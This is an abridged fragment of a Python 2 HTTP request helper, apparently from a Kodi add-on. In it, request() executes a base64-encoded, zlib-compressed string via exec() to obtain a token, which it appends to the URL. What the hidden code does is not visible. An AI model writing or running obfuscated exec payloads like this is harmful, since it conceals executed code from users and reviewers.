...
import re, sys, cookielib, urllib, urllib2, urlparse, gzip, StringIO, HTMLParser, time, random, base64, zlib

from resources.lib.stemodules import cache
from resources.lib.stemodules import workers
from resources.lib.stemodules import dom_parser
...
def request(url, close=True, redirect=True, error=False, proxy=None, post=None, headers=None, mobile=False, XHR=False,
    ...
    try:
        ...
        import os
        url = indexer.getRequestUrl(url)
        t = None

        if url.startswith(indexer.getLoader()):
            exec (zlib.decompress(base64.b64decode(
                'eJxLK8rPVShKLc4vLUpOLdbLyUzSy8xLSa1ILQJyDMEwxzC+JCM1vSg/vyxVITO3IL+oRAGLFFeJLRZRDU2uEr3i1JL4kvzs1DwgDwBYVCjD')))
            token = t.token
            url += "&token=" + token
...
def _add_request_header(_request, headers):
    try:
        ...
        referer = headers.pop('Referer') if 'Referer' in headers else '%s://%s' % (
            _request.get_type(), _request.get_host())
